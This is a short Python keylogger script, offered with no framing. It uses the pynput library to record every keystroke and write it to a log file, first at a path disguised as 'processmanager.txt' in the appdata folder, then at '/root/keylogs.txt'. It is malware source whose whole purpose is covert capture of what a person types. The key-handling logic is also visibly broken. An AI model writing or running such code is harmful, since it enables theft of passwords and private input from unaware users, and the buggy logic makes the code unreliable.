import os 
from pynput.keyboard import Listener

keys = []
count = 0
path = os.environ['appdata'] +'processmanager.txt'
path = '/root/keylogs.txt'

def on_press(key):
    global keys, count 
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(path,'w') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find('backspace') > 0:
                f.write(' Backspace ') 
            elif k.find('Enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space'):
                f.write(' ')
            elif k.find(' caps_lock'):
                f.write(' caps_lock ')
            elif k.find('Key'):
                f.write(k)
with Listener(on_press=on_press) as listener:
    listener.join()


